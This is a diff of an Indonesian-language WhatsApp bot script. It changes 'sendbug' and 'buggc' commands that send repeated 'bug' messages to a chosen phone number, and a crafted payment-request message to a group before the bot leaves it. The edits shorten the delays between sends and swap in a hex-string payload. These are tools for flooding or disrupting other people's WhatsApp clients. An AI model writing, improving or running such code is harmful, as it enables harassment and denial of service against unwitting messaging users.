@@ -146,7 +146,7 @@ if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
 if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 reply('Loading...')
 for (let i = 0; i < nd[1]; i++){
-await sleep(6000)
+await sleep(3000)
 reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
 let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
 await sleep(3000)
@@ -178,7 +178,7 @@ reply('Loading...')
 function delay1Menit(i) { setTimeout(() => {
 reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
 semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: contactMessage })
-delay1Menit(++i)}, 30000)}
+delay1Menit(++i)}, 10000)}
 delay1Menit(0)
 break
 
@@ -186,9 +186,9 @@ break
 case 'buggc':
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
-requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎"}}}), { userJid: msg.chat })
+requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: msg.chat })
 semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
-await sleep(2000)
+await sleep(3000)
 await semar.groupLeave(from)
 break
 
